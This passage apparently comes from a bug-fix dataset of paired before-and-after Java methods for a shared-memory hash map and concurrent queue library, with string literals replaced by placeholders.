  int readLocation=this.consumerReadLocation;
  int i=0;
  int writeLocation=this.locator.getWriterLocation();
  do {
    if (writeLocation == readLocation) {
      writeLocation=this.locator.getWriterLocation();
      if (writeLocation == readLocation) {
        setReadLocation(readLocation);
        return i;
      }
    }
    readLocation=(readLocation + 1 == dataLocator.getCapacity()) ? 0 : readLocation + 1;
    target[i]=dataLocator.getData(readLocation);
  }
 while (i <= maxElements);
  setReadLocation(readLocation);
  return maxElements;
}"
91452,"@Override public boolean removeAll(Collection<?> c){
  final E[] newData=(E[])new Object[dataLocator.getCapacity()];
  boolean hasRemovedItem=false;
  int read=this.locator.getReadLocation();
  int write=this.locator.getWriteLocation();
  if (read == write)   return false;
  int i=0;
  if (read < write) {
    for (int location=read; location < write; location++) {
      if (c.contains(dataLocator.getData(location))) {
        hasRemovedItem=true;
      }
 else {
        newData[i++]=dataLocator.getData(location);
      }
    }
  }
 else {
    for (int location=read; location < dataLocator.getCapacity(); location++) {
      if (!c.contains(dataLocator.getData(location))) {
        hasRemovedItem=true;
      }
 else {
        newData[i++]=dataLocator.getData(location);
      }
    }
    for (int location=0; location <= write; location++) {
      if (!c.contains(dataLocator.getData(location))) {
        hasRemovedItem=true;
      }
 else {
        newData[i++]=dataLocator.getData(location);
      }
    }
  }
  if (!hasRemovedItem)   return false;
  this.locator.setReadLocation(0);
  this.locator.setWriteLocation(i);
  dataLocator.writeAll(newData,i);
  return true;
}","@Override public boolean removeAll(Collection<?> c){
  final E[] newData=(E[])new Object[dataLocator.getCapacity()];
  boolean hasRemovedItem=false;
  int read=this.locator.getReadLocation();
  int write=this.locator.getWriterLocation();
  if (read == write)   return false;
  int i=0;
  if (read < write) {
    for (int location=read; location < write; location++) {
      if (c.contains(dataLocator.getData(location))) {
        hasRemovedItem=true;
      }
 else {
        newData[i++]=dataLocator.getData(location);
      }
    }
  }
 else {
    for (int location=read; location < dataLocator.getCapacity(); location++) {
      if (!c.contains(dataLocator.getData(location))) {
        hasRemovedItem=true;
      }
 else {
        newData[i++]=dataLocator.getData(location);
      }
    }
    for (int location=0; location <= write; location++) {
      if (!c.contains(dataLocator.getData(location))) {
        hasRemovedItem=true;
      }
 else {
        newData[i++]=dataLocator.getData(location);
      }
    }
  }
  if (!hasRemovedItem)   return false;
  this.locator.setReadLocation(0);
  this.locator.setWriterLocation(i);
  dataLocator.writeAll(newData,i);
  return true;
}"
91453,"/** 
 * Returns <tt>true</tt> if this queue contains the specified element. More formally, returns <tt>true</tt> if and only if this queue contains at least one element <tt>e</tt> such that <tt>o.equals(e)</tt>. The behavior of this operation is undefined if modified while the operation is in progress.
 * @param o object to be checked for containment in this queue
 * @return <tt>true</tt> if this queue contains the specified element
 * @throws ClassCastException   if the class of the specified elementis incompatible with this queue (<a href=""../Collection.html#optional-restrictions"">optional</a>)
 * @throws NullPointerException if the specified element is null(<a href=""../Collection.html#optional-restrictions"">optional</a>)
 */
public boolean contains(Object o){
  if (o == null)   throw new NullPointerException(""String_Node_Str"");
  int read=this.locator.getReadLocation();
  int write=this.locator.getWriteLocation();
  if (read == write)   return false;
  if (read < write) {
    for (int location=read; location < write; location++) {
      if (o.equals(dataLocator.getData(location)))       return true;
    }
    return false;
  }
  for (int location=read; location < dataLocator.getCapacity(); location++) {
    if (o.equals(dataLocator.getData(location)))     return true;
  }
  for (int location=0; location < write; location++) {
    if (o.equals(dataLocator.getData(location)))     return true;
  }
  return false;
}","/** 
 * Returns <tt>true</tt> if this queue contains the specified element. More formally, returns <tt>true</tt> if and only if this queue contains at least one element <tt>e</tt> such that <tt>o.equals(e)</tt>. The behavior of this operation is undefined if modified while the operation is in progress.
 * @param o object to be checked for containment in this queue
 * @return <tt>true</tt> if this queue contains the specified element
 * @throws ClassCastException   if the class of the specified elementis incompatible with this queue (<a href=""../Collection.html#optional-restrictions"">optional</a>)
 * @throws NullPointerException if the specified element is null(<a href=""../Collection.html#optional-restrictions"">optional</a>)
 */
public boolean contains(Object o){
  if (o == null)   throw new NullPointerException(""String_Node_Str"");
  int read=this.locator.getReadLocation();
  int write=this.locator.getWriterLocation();
  if (read == write)   return false;
  if (read < write) {
    for (int location=read; location < write; location++) {
      if (o.equals(dataLocator.getData(location)))       return true;
    }
    return false;
  }
  for (int location=read; location < dataLocator.getCapacity(); location++) {
    if (o.equals(dataLocator.getData(location)))     return true;
  }
  for (int location=0; location < write; location++) {
    if (o.equals(dataLocator.getData(location)))     return true;
  }
  return false;
}"
91454,"@Override public <T>T[] toArray(T[] result){
  final int read=locator.getReadLocation();
  int write=locator.getWriteLocation();
  if (result.length == 0)   return result;
  if (read > write)   write+=dataLocator.getCapacity();
  int size=write - read;
  if (size > result.length)   result=(T[])java.lang.reflect.Array.newInstance(result.getClass().getComponentType(),size + 1);
  int i=0;
  for (int location=read; location < write; location++) {
    result[i++]=(T)dataLocator.getData(location);
  }
  if (i < result.length - 1) {
    Arrays.fill((Object[])result,i,result.length,null);
  }
  return result;
}","@Override public <T>T[] toArray(T[] result){
  final int read=locator.getReadLocation();
  int write=locator.getWriterLocation();
  if (result.length == 0)   return result;
  if (read > write)   write+=dataLocator.getCapacity();
  int size=write - read;
  if (size > result.length)   result=(T[])java.lang.reflect.Array.newInstance(result.getClass().getComponentType(),size + 1);
  int i=0;
  for (int location=read; location < write; location++) {
    result[i++]=(T)dataLocator.getData(location);
  }
  if (i < result.length - 1) {
    Arrays.fill((Object[])result,i,result.length,null);
  }
  return result;
}"
91455,"@Override public String toString(){
  final int read=locator.getReadLocation();
  int write=locator.getWriteLocation();
  if (read == write) {
    return ""String_Node_Str"";
  }
  if (read > write)   write+=dataLocator.getCapacity();
  int size=write - read;
  StringBuilder builder=new StringBuilder(""String_Node_Str"");
  int i=0;
  for (int location=read; location < write; location++) {
    builder.append(dataLocator.getData(location)).append(',');
  }
  builder.deleteCharAt(builder.length() - 1);
  builder.append(""String_Node_Str"");
  return builder.toString();
}","@Override public String toString(){
  final int read=locator.getReadLocation();
  int write=locator.getWriterLocation();
  if (read == write) {
    return ""String_Node_Str"";
  }
  if (read > write)   write+=dataLocator.getCapacity();
  int size=write - read;
  StringBuilder builder=new StringBuilder(""String_Node_Str"");
  int i=0;
  for (int location=read; location < write; location++) {
    builder.append(dataLocator.getData(location)).append(',');
  }
  builder.deleteCharAt(builder.length() - 1);
  builder.append(""String_Node_Str"");
  return builder.toString();
}"
91456,"@Override public boolean retainAll(Collection<?> c){
  final E[] newData=(E[])new Object[dataLocator.getCapacity()];
  boolean changed=false;
  int read=this.locator.getReadLocation();
  int write=this.locator.getWriteLocation();
  if (read == write)   return false;
  int i=0;
  if (read < write) {
    for (int location=read; location < write; location++) {
      if (c.contains(dataLocator.getData(location))) {
        newData[i++]=dataLocator.getData(location);
      }
 else {
        changed=true;
      }
    }
  }
 else {
    for (int location=read; location < dataLocator.getCapacity(); location++) {
      if (c.contains(dataLocator.getData(location))) {
        newData[i++]=dataLocator.getData(location);
      }
 else {
        changed=true;
      }
    }
    for (int location=0; location <= write; location++) {
      if (c.contains(dataLocator.getData(location))) {
        newData[i++]=dataLocator.getData(location);
      }
 else {
        changed=true;
      }
    }
  }
  if (changed) {
    this.locator.setReadLocation(0);
    this.locator.setWriteLocation(i);
    dataLocator.writeAll(newData,i);
    return true;
  }
  return false;
}","@Override public boolean retainAll(Collection<?> c){
  final E[] newData=(E[])new Object[dataLocator.getCapacity()];
  boolean changed=false;
  int read=this.locator.getReadLocation();
  int write=this.locator.getWriterLocation();
  if (read == write)   return false;
  int i=0;
  if (read < write) {
    for (int location=read; location < write; location++) {
      if (c.contains(dataLocator.getData(location))) {
        newData[i++]=dataLocator.getData(location);
      }
 else {
        changed=true;
      }
    }
  }
 else {
    for (int location=read; location < dataLocator.getCapacity(); location++) {
      if (c.contains(dataLocator.getData(location))) {
        newData[i++]=dataLocator.getData(location);
      }
 else {
        changed=true;
      }
    }
    for (int location=0; location <= write; location++) {
      if (c.contains(dataLocator.getData(location))) {
        newData[i++]=dataLocator.getData(location);
      }
 else {
        changed=true;
      }
    }
  }
  if (changed) {
    this.locator.setReadLocation(0);
    this.locator.setWriterLocation(i);
    dataLocator.writeAll(newData,i);
    return true;
  }
  return false;
}"
91457,"@Override public E element(){
  final int readLocation=this.consumerReadLocation;
  final int nextReadLocation=(readLocation + 1 == dataLocator.getCapacity()) ? 0 : readLocation + 1;
  if (locator.getWriteLocation() == readLocation)   throw new NoSuchElementException();
  final E value=dataLocator.getData(readLocation);
  setReadLocation(nextReadLocation);
  return value;
}","@Override public E element(){
  final int readLocation=this.consumerReadLocation;
  final int nextReadLocation=(readLocation + 1 == dataLocator.getCapacity()) ? 0 : readLocation + 1;
  if (locator.getWriterLocation() == readLocation)   throw new NoSuchElementException();
  final E value=dataLocator.getData(readLocation);
  setReadLocation(nextReadLocation);
  return value;
}"
91458,"@Override public int getReadLocation(){
  return directBytes.readInt(READ_OFFSET);
}","@Override public int getReadLocation(){
  return directBytes.readVolatileInt(READ_OFFSET);
}"
91459,"@Override public void setReadLocation(int nextReadLocation){
  directBytes.writeInt(READ_OFFSET,nextReadLocation);
}","@Override public void setReadLocation(int nextReadLocation){
  directBytes.writeOrderedInt(READ_OFFSET,nextReadLocation);
}"
91460,"/** 
 * reader and add, reader and writers on different threads
 * @throws Exception
 */
@Test @Ignore public void testWithFasterReader() throws Exception {
  final BlockingQueue<Integer> queue=new SharedConcurrentBlockingObjectQueue<Integer>();
  final int max=100;
  final CountDownLatch countDown=new CountDownLatch(1);
  final AtomicBoolean success=new AtomicBoolean(true);
  new Thread(new Runnable(){
    @Override public void run(){
      for (int i=1; i < max; i++) {
        try {
          queue.put(i);
          Thread.sleep((int)(Math.random() * 100));
        }
 catch (        InterruptedException e) {
          e.printStackTrace();
        }
      }
    }
  }
).start();
  new Thread(new Runnable(){
    @Override public void run(){
      int value=0;
      for (int i=1; i < max; i++) {
        try {
          final int newValue=queue.take();
          junit.framework.Assert.assertEquals(i,newValue);
          if (newValue != value + 1) {
            success.set(false);
            return;
          }
          value=newValue;
          Thread.sleep((int)(Math.random() * 10));
        }
 catch (        InterruptedException e) {
          e.printStackTrace();
        }
      }
      countDown.countDown();
    }
  }
).start();
  countDown.await();
  Assert.assertTrue(success.get());
}","/** 
 * reader and add, reader and writers on different threads
 * @throws Exception
 */
@Test public void testWithFasterReader() throws Exception {
  final BlockingQueue<Integer> queue=new SharedConcurrentBlockingObjectQueue<Integer>();
  final int max=100;
  final CountDownLatch countDown=new CountDownLatch(1);
  final AtomicBoolean success=new AtomicBoolean(true);
  new Thread(new Runnable(){
    @Override public void run(){
      for (int i=1; i < max; i++) {
        try {
          queue.put(i);
          Thread.sleep((int)(Math.random() * 100));
        }
 catch (        InterruptedException e) {
          e.printStackTrace();
        }
      }
    }
  }
).start();
  new Thread(new Runnable(){
    @Override public void run(){
      int value=0;
      for (int i=1; i < max; i++) {
        try {
          final int newValue=queue.take();
          junit.framework.Assert.assertEquals(i,newValue);
          if (newValue != value + 1) {
            success.set(false);
            return;
          }
          value=newValue;
          Thread.sleep((int)(Math.random() * 10));
        }
 catch (        InterruptedException e) {
          e.printStackTrace();
        }
      }
      countDown.countDown();
    }
  }
).start();
  countDown.await();
  Assert.assertTrue(success.get());
}"
91461,"@Test public void testDifferentHeaders() throws IOException {
  Random rand=new Random(1);
  for (int i=1; i <= 1000; i++) {
    rand.setSeed(i);
    File file=new File(System.getProperty(""String_Node_Str""),""String_Node_Str"" + i);
    file.deleteOnExit();
    SharedHashMapBuilder builder1=createBuilder(rand);
    SharedHashMap<String,String> map=builder1.create(file,String.class,String.class);
    SharedHashMapBuilder builder2=map.builder();
    map.close();
    SharedHashMapBuilder builder3=createBuilder(rand);
    SharedHashMap<String,String> map2=builder3.create(file,String.class,String.class);
    SharedHashMapBuilder builder4=map2.builder();
    assertEquals(builder2.toString(),builder4.toString());
    assertEquals(builder2,builder4);
    map2.close();
    file.delete();
  }
}","@Test @Ignore public void testDifferentHeaders() throws IOException {
  Random rand=new Random(1);
  for (int i=1; i <= 1000; i++) {
    rand.setSeed(i);
    File file=new File(System.getProperty(""String_Node_Str""),""String_Node_Str"" + i);
    file.deleteOnExit();
    SharedHashMapBuilder builder1=createBuilder(rand);
    SharedHashMap<String,String> map=builder1.create(file,String.class,String.class);
    SharedHashMapBuilder builder2=map.builder();
    map.close();
    SharedHashMapBuilder builder3=createBuilder(rand);
    SharedHashMap<String,String> map2=builder3.create(file,String.class,String.class);
    SharedHashMapBuilder builder4=map2.builder();
    assertEquals(builder2.toString(),builder4.toString());
    assertEquals(builder2,builder4);
    map2.close();
    file.delete();
  }
}"
91462,"public static LongValue nativeLongValue(){
  return new LongValuenative();
}","public static LongValue nativeLongValue(){
  return new LongValue$$Native();
}"
91463,"@Test public void testGetWithoutAcquireFirst() throws Exception {
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(10 * 1000,128,24);
  assertNull(map.getUsing(""String_Node_Str"",new LongValuenative()));
  map.close();
}","@Test public void testGetWithoutAcquireFirst() throws Exception {
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(10 * 1000,128,24);
  assertNull(map.getUsing(""String_Node_Str"",new LongValue$$Native()));
  map.close();
}"
91464,"@Test public void testAcquireFromMultipleThreads() throws Exception {
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(1000 * 1000,128,24);
  CharSequence key=getUserCharSequence(0);
  map.acquireUsing(key,new LongValuenative());
  int iterations=1000;
  int noOfThreads=10;
  CyclicBarrier barrier=new CyclicBarrier(noOfThreads);
  Thread[] threads=new Thread[noOfThreads];
  for (int t=0; t < noOfThreads; t++) {
    threads[t]=new Thread(new IncrementRunnable(map,key,iterations,barrier));
    threads[t].start();
  }
  for (int t=0; t < noOfThreads; t++) {
    threads[t].join();
  }
  assertEquals(noOfThreads * iterations,map.acquireUsing(key,new LongValuenative()).getValue());
  map.close();
}","@Test public void testAcquireFromMultipleThreads() throws Exception {
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(1000 * 1000,128,24);
  CharSequence key=getUserCharSequence(0);
  map.acquireUsing(key,new LongValue$$Native());
  int iterations=1000;
  int noOfThreads=10;
  CyclicBarrier barrier=new CyclicBarrier(noOfThreads);
  Thread[] threads=new Thread[noOfThreads];
  for (int t=0; t < noOfThreads; t++) {
    threads[t]=new Thread(new IncrementRunnable(map,key,iterations,barrier));
    threads[t].start();
  }
  for (int t=0; t < noOfThreads; t++) {
    threads[t].join();
  }
  assertEquals(noOfThreads * iterations,map.acquireUsing(key,new LongValue$$Native()).getValue());
  map.close();
}"
91465,"@Test public void testAcquireWithNullContainer() throws Exception {
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(10 * 1000,128,24);
  map.acquireUsing(""String_Node_Str"",new LongValuenative());
  assertEquals(0,map.acquireUsing(""String_Node_Str"",null).getValue());
  map.close();
}","@Test public void testAcquireWithNullContainer() throws Exception {
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(10 * 1000,128,24);
  map.acquireUsing(""String_Node_Str"",new LongValue$$Native());
  assertEquals(0,map.acquireUsing(""String_Node_Str"",null).getValue());
  map.close();
}"
91466,"@Test public void testAcquireAndGet() throws IOException, ClassNotFoundException, IllegalAccessException, InstantiationException {
  int entries=1000 * 1000;
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(entries,128,24);
  LongValue value=new LongValuenative();
  LongValue value2=new LongValuenative();
  LongValue value3=new LongValuenative();
  for (int j=1; j <= 3; j++) {
    for (int i=0; i < entries; i++) {
      CharSequence userCS=getUserCharSequence(i);
      if (j > 1) {
        assertNotNull(map.getUsing(userCS,value));
      }
 else {
        map.acquireUsing(userCS,value);
      }
      assertEquals(j - 1,value.getValue());
      value.addAtomicValue(1);
      assertEquals(value2,map.acquireUsing(userCS,value2));
      assertEquals(j,value2.getValue());
      assertEquals(value3,map.getUsing(userCS,value3));
      assertEquals(j,value3.getValue());
    }
  }
  map.close();
}","@Test public void testAcquireAndGet() throws IOException, ClassNotFoundException, IllegalAccessException, InstantiationException {
  int entries=1000 * 1000;
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(entries,128,24);
  LongValue value=new LongValue$$Native();
  LongValue value2=new LongValue$$Native();
  LongValue value3=new LongValue$$Native();
  for (int j=1; j <= 3; j++) {
    for (int i=0; i < entries; i++) {
      CharSequence userCS=getUserCharSequence(i);
      if (j > 1) {
        assertNotNull(map.getUsing(userCS,value));
      }
 else {
        map.acquireUsing(userCS,value);
      }
      assertEquals(j - 1,value.getValue());
      value.addAtomicValue(1);
      assertEquals(value2,map.acquireUsing(userCS,value2));
      assertEquals(j,value2.getValue());
      assertEquals(value3,map.getUsing(userCS,value3));
      assertEquals(j,value3.getValue());
    }
  }
  map.close();
}"
91467,"@Test public void testGetWithNullContainer() throws Exception {
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(10 * 1000,128,24);
  map.acquireUsing(""String_Node_Str"",new LongValuenative());
  assertEquals(0,map.getUsing(""String_Node_Str"",null).getValue());
  map.close();
}","@Test public void testGetWithNullContainer() throws Exception {
  SharedHashMap<CharSequence,LongValue> map=getSharedMap(10 * 1000,128,24);
  map.acquireUsing(""String_Node_Str"",new LongValue$$Native());
  assertEquals(0,map.getUsing(""String_Node_Str"",null).getValue());
  map.close();
}"
91468,"Entry<K,V> getNextEntry(Bytes prevKeyBytes){
  int pos;
  if (prevKeyBytes == null) {
    pos=hashLookup.firstPos();
  }
 else {
    int hash=hasher.segmentHash(hasher.hash(prevKeyBytes));
    pos=hashLookup.nextKeyAfter(hash);
  }
  if (pos >= 0) {
    final long offset=entriesOffset + pos * entrySize + metaDataBytes;
    int length=entrySize - metaDataBytes;
    tmpBytes.storePositionAndSize(bytes,offset,length);
    tmpBytes.readStopBit();
    K key=tmpBytes.readInstance(kClass,null);
    tmpBytes.readStopBit();
    final long valueOffset=align(tmpBytes.position());
    tmpBytes.position(valueOffset);
    V value=readObjectUsing(null,offset + valueOffset);
    return new SimpleEntry<K,V>(key,value);
  }
 else {
    return null;
  }
}","Entry<K,V> getNextEntry(K prevKey){
  int pos;
  if (prevKey == null) {
    pos=hashLookup.firstPos();
  }
 else {
    int hash=hasher.segmentHash(hasher.hash(getKeyAsBytes(prevKey)));
    pos=hashLookup.nextKeyAfter(hash);
  }
  if (pos >= 0) {
    final long offset=entriesOffset + pos * entrySize + metaDataBytes;
    int length=entrySize - metaDataBytes;
    tmpBytes.storePositionAndSize(bytes,offset,length);
    tmpBytes.readStopBit();
    K key=tmpBytes.readInstance(kClass,null);
    tmpBytes.readStopBit();
    final long valueOffset=align(tmpBytes.position());
    tmpBytes.position(valueOffset);
    V value=readObjectUsing(null,offset + valueOffset);
    return new SimpleEntry<K,V>(key,value);
  }
 else {
    return null;
  }
}"
91469,"Entry<K,V> nextSegmentEntry(){
  while (segmentIndex >= 0) {
    Segment segment=segments[segmentIndex];
    Entry<K,V> entry=segment.getNextEntry(lastSegmentKeyBytes);
    if (entry == null) {
      segmentIndex--;
      lastSegmentKeyBytes=null;
    }
 else {
      lastSegmentKeyBytes=getKeyAsBytes(entry.getKey());
      return entry;
    }
  }
  return null;
}","Entry<K,V> nextSegmentEntry(){
  while (segmentIndex >= 0) {
    Segment segment=segments[segmentIndex];
    Entry<K,V> entry=segment.getNextEntry(lastSegmentKey);
    if (entry == null) {
      segmentIndex--;
      lastSegmentKey=null;
    }
 else {
      lastSegmentKey=entry.getKey();
      return entry;
    }
  }
  return null;
}"
91470,"public boolean putLimited(int key,int value,int limit){
  if (key == UNSET_KEY)   key=HASH_INSTEAD_OF_UNSET_KEY;
 else   if ((key & 0xFFFF) != key)   throw new IllegalArgumentException(""String_Node_Str"" + key);
  if ((value & 0xFFFF) != value)   throw new IllegalArgumentException(""String_Node_Str"" + value);
  int pos=(key & capacityMask) << 2;
  for (int i=0; i < limit; i++) {
    int entry=bytes.readInt(pos);
    int hash2=entry >>> 16;
    if (hash2 == UNSET_KEY) {
      bytes.writeInt(pos,((key << 16) | (value & 0xFFFF)));
      return true;
    }
    if (hash2 == key) {
      int value2=entry;
      if (value2 == value)       return true;
    }
    pos=(pos + ENTRY_SIZE) & capacityMask2;
  }
  return false;
}","public boolean putLimited(int key,int value,int limit){
  if (key == UNSET_KEY)   key=HASH_INSTEAD_OF_UNSET_KEY;
 else   if ((key & 0xFFFF) != key)   throw new IllegalArgumentException(""String_Node_Str"" + key);
  if ((value & 0xFFFF) != value)   throw new IllegalArgumentException(""String_Node_Str"" + value);
  int pos=(key & capacityMask) << 2;
  for (int i=0; i < limit; i++) {
    int entry=bytes.readInt(pos);
    int hash2=entry >>> 16;
    if (hash2 == UNSET_KEY) {
      bytes.writeInt(pos,((key << 16) | (value & 0xFFFF)));
      return true;
    }
    if (hash2 == key) {
      int value2=entry & 0xFFFF;
      if (value2 == value)       return true;
    }
    pos=(pos + ENTRY_SIZE) & capacityMask2;
  }
  return false;
}"
91471,"@Override public int nextKeyAfter(int key){
  startSearch(key);
  while (searchPos < capacity * ENTRY_SIZE) {
    int entry=bytes.readInt(searchPos);
    int hash2=entry >> 16;
    if (hash2 != UNSET_KEY && hash2 != searchHash) {
      return entry & 0xFFFF;
    }
    searchPos=searchPos + ENTRY_SIZE;
  }
  return -1;
}","@Override public int nextKeyAfter(int key){
  startSearch(key);
  while (searchPos < capacity * ENTRY_SIZE) {
    int entry=bytes.readInt(searchPos);
    int hash2=entry >>> 16;
    if (hash2 != UNSET_KEY && hash2 != searchHash) {
      return entry & 0xFFFF;
    }
    searchPos=searchPos + ENTRY_SIZE;
  }
  return -1;
}"
91472,"/** 
 * implementation for map.remove(Key,Value)
 * @param keyBytes      the key of the entry to remove
 * @param expectedValue the entry will only be removed if the {@param existingValue} equals null or the {@param existingValue} equals that of the entry.value
 * @param hash2         a hash code relating to the {@keyBytes} ( not the natural hash of {@keyBytes}  )
 * @return if the entry corresponding to the {@param keyBytes} exists and removeReturnsNull==false, returns the value of the entry that was removed, otherwise null is returned
 */
V remove(final DirectBytes keyBytes,final V expectedValue,int hash2){
  lock();
  try {
    hash2=hashLookup.startSearch(hash2);
    while (true) {
      final int pos=hashLookup.nextPos();
      if (pos < 0) {
        return null;
      }
 else {
        final long offset=entriesOffset + pos * entrySize;
        tmpBytes.storePositionAndSize(bytes,offset,entrySize);
        if (!keyEquals(keyBytes,tmpBytes))         continue;
        final long keyLength=align(keyBytes.remaining() + tmpBytes.position());
        tmpBytes.position(keyLength);
        V valueRemoved=expectedValue == null && removeReturnsNull ? null : readObjectUsing(null,offset + keyLength);
        if (expectedValue != null && !expectedValue.equals(valueRemoved))         return null;
        hashLookup.remove(hash2,pos);
        decrementSize();
        freeList.clear(pos);
        if (pos < nextSet)         nextSet=pos;
        return valueRemoved;
      }
    }
  }
  finally {
    unlock();
  }
}","/** 
 * implementation for map.remove(Key,Value)
 * @param keyBytes      the key of the entry to remove
 * @param expectedValue the entry will only be removed if the {@param existingValue} equals null or the {@param existingValue} equals that of the entry.value
 * @param hash2         a hash code relating to the {@keyBytes} ( not the natural hash of {@keyBytes}  )
 * @return if the entry corresponding to the {@param keyBytes} exists and removeReturnsNull==false, returns the value of the entry that was removed, otherwise null is returned
 */
V remove(final DirectBytes keyBytes,final V expectedValue,int hash2){
  lock();
  try {
    hash2=hashLookup.startSearch(hash2);
    while (true) {
      final int pos=hashLookup.nextPos();
      if (pos < 0) {
        return null;
      }
 else {
        final long offset=entriesOffset + pos * entrySize;
        tmpBytes.storePositionAndSize(bytes,offset,entrySize);
        if (!keyEquals(keyBytes,tmpBytes))         continue;
        final long keyLength=keyBytes.remaining() + tmpBytes.position();
        tmpBytes.position(keyLength);
        tmpBytes.readStopBit();
        tmpBytes.alignPositionAddr(4);
        V valueRemoved=expectedValue == null && removeReturnsNull ? null : readObjectUsing(null,offset + keyLength);
        if (expectedValue != null && !expectedValue.equals(valueRemoved))         return null;
        hashLookup.remove(hash2,pos);
        decrementSize();
        freeList.clear(pos);
        if (pos < nextSet)         nextSet=pos;
        return valueRemoved;
      }
    }
  }
  finally {
    unlock();
  }
}"
91473,"public static void main(String[] args) throws Exception {
  int numTests=100;
  int size=36864;
  if (args.length == 0)   System.out.println(""String_Node_Str"");
  if (args.length > 1) {
    String et=args[1].toLowerCase();
    if (et.startsWith(""String_Node_Str""))     eclass=java.lang.Integer.class;
 else     if (et.startsWith(""String_Node_Str""))     eclass=java.lang.Float.class;
 else     if (et.startsWith(""String_Node_Str""))     eclass=java.lang.String.class;
 else     if (et.startsWith(""String_Node_Str""))     eclass=java.lang.Double.class;
  }
  if (eclass == null)   eclass=Object.class;
  if (args.length > 2)   numTests=Integer.parseInt(args[2]);
  if (args.length > 3)   size=Integer.parseInt(args[3]);
  boolean doSerializeTest=args.length > 4;
  while ((size & 3) != 0)   ++size;
  System.out.print(""String_Node_Str"" + eclass.getName());
  System.out.print(""String_Node_Str"" + numTests);
  System.out.print(""String_Node_Str"" + size);
  System.out.println();
  Object[] key=new Object[size];
  Object[] absent=new Object[size];
  initializeKeys(key,absent,size);
  precheck(size,key,absent);
  for (int rep=0; rep < numTests; ++rep) {
    mainTest(newMap(),key,absent);
    if ((rep & 3) == 3 && rep < numTests - 1) {
      shuffle(key);
    }
  }
  TestTimer.printStats();
  checkNullKey();
  if (doSerializeTest)   serTest(newMap(),size);
}","public static void main(String[] args) throws Exception {
  int numTests=100;
  int size=36864;
  if (args.length == 0)   System.out.println(""String_Node_Str"");
  if (args.length > 1) {
    String et=args[1].toLowerCase();
    if (et.startsWith(""String_Node_Str""))     eclass=java.lang.Integer.class;
 else     if (et.startsWith(""String_Node_Str""))     eclass=java.lang.Float.class;
 else     if (et.startsWith(""String_Node_Str""))     eclass=java.lang.String.class;
 else     if (et.startsWith(""String_Node_Str""))     eclass=java.lang.Double.class;
  }
  if (eclass == null)   eclass=Integer.class;
  if (args.length > 2)   numTests=Integer.parseInt(args[2]);
  if (args.length > 3)   size=Integer.parseInt(args[3]);
  boolean doSerializeTest=args.length > 4;
  while ((size & 3) != 0)   ++size;
  System.out.print(""String_Node_Str"" + eclass.getName());
  System.out.print(""String_Node_Str"" + numTests);
  System.out.print(""String_Node_Str"" + size);
  System.out.println();
  Object[] key=new Object[size];
  Object[] absent=new Object[size];
  initializeKeys(key,absent,size);
  precheck(size,key,absent);
  for (int rep=0; rep < numTests; ++rep) {
    mainTest(newMap(),key,absent);
    if ((rep & 3) == 3 && rep < numTests - 1) {
      shuffle(key);
    }
  }
  TestTimer.printStats();
  checkNullKey();
  if (doSerializeTest)   serTest(newMap(),size);
}"
91474,"static void mainTest(Map s,Object[] key,Object[] absent){
  int size=key.length;
  putTest(""String_Node_Str"",size,s,key,size);
  reallyAssert(s.size() == size);
  getTest(""String_Node_Str"",size,s,key,size);
  getTest(""String_Node_Str"",size,s,absent,0);
  kitTest(s,size);
  vitTest(s,size);
  eitTest(s,size);
  putTest(""String_Node_Str"",size,s,key,0);
  reallyAssert(s.size() == size);
  untimedKeyTest(""String_Node_Str"",size,s,key,size);
  keyTest(""String_Node_Str"",size,s,absent,0);
  valTest(s,key);
  remTest(""String_Node_Str"",size,s,absent,0);
  reallyAssert(s.size() == size);
  remHalfTest(""String_Node_Str"",size,s,key,size / 2);
  reallyAssert(s.size() == size / 2);
  getTest(""String_Node_Str"",size,s,key,size / 2);
  putTest(""String_Node_Str"",size,s,key,size / 2);
  reallyAssert(s.size() == size);
  getTest(""String_Node_Str"",size,s,key,size);
  getTest(""String_Node_Str"",size,s,absent,0);
  itRemTest(s,size);
  putTest(""String_Node_Str"",size,s,key,size);
  reallyAssert(s.size() == size);
  getTest(""String_Node_Str"",size,s,key,size);
  untimedKeyTest(""String_Node_Str"",size,s,key,size);
  kitTest(s,size);
  vitTest(s,size);
  eitTest(s,size);
  twoMapTest1(s,key,absent);
  twoMapTest2(s,key,absent);
}","static void mainTest(Map s,Object[] key,Object[] absent){
  int size=key.length;
  putTest(""String_Node_Str"",size,s,key,size);
  reallyAssert(s.size() == size);
  getTest(""String_Node_Str"",size,s,key,size);
  getTest(""String_Node_Str"",size,s,absent,0);
  putTest(""String_Node_Str"",size,s,key,0);
  reallyAssert(s.size() == size);
  untimedKeyTest(""String_Node_Str"",size,s,key,size);
  keyTest(""String_Node_Str"",size,s,absent,0);
  remTest(""String_Node_Str"",size,s,absent,0);
  reallyAssert(s.size() == size);
  remHalfTest(""String_Node_Str"",size,s,key,size / 2);
  reallyAssert(s.size() == size / 2);
  getTest(""String_Node_Str"",size,s,key,size / 2);
  putTest(""String_Node_Str"",size,s,key,size / 2);
  reallyAssert(s.size() == size);
  getTest(""String_Node_Str"",size,s,key,size);
  getTest(""String_Node_Str"",size,s,absent,0);
  itRemTest(s,size);
  putTest(""String_Node_Str"",size,s,key,size);
  reallyAssert(s.size() == size);
  getTest(""String_Node_Str"",size,s,key,size);
  untimedKeyTest(""String_Node_Str"",size,s,key,size);
  kitTest(s,size);
  vitTest(s,size);
  eitTest(s,size);
  twoMapTest1(s,key,absent);
  twoMapTest2(s,key,absent);
}"
91475,"static Map newMap(){
  try {
    return new ConcurrentHashMap();
  }
 catch (  Exception e) {
    throw new RuntimeException(""String_Node_Str"" + e);
  }
}","static Map newMap(){
  try {
    return new SharedHashMapBuilder().create(getPersistenceFile(),Object.class,Object.class);
  }
 catch (  Exception e) {
    throw new RuntimeException(""String_Node_Str"" + e);
  }
}"
91476,"static void initializeKeys(Object[] key,Object[] absent,int size){
  if (eclass == Object.class) {
    for (int i=0; i < size; ++i)     key[i]=new Object();
    for (int i=0; i < size; ++i)     absent[i]=new Object();
  }
 else   if (eclass == Integer.class) {
    initInts(key,absent,size);
  }
 else   if (eclass == Float.class) {
    initFloats(key,absent,size);
  }
 else   if (eclass == Double.class) {
